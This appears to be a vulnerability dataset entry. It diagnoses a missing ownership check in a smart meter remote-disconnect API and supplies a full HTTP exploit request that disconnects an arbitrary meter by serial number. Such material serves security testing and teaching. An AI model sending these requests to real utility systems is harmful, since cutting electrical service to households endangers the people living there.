diagnosis: The smart meter remote disconnect endpoint validates meterSerialNumber as a 16-character hex string using Joi, but issues disconnect commands without verifying that the caller is the property owner or an authorized utility operator. Any user can disconnect electrical service to arbitrary households by supplying target serial numbers.
exploit_request:
POST /api/utilities/smart-meter/disconnect HTTP/1.1
Host: smartgrid.utility.internal:7008
Authorization: Bearer <customer_jwt>
Content-Type: application/json

{
  "meterSerialNumber": "1a2b3c4d5e6f7a8b",
  "reasonCode": "TENANT_MOVE_OUT"
}
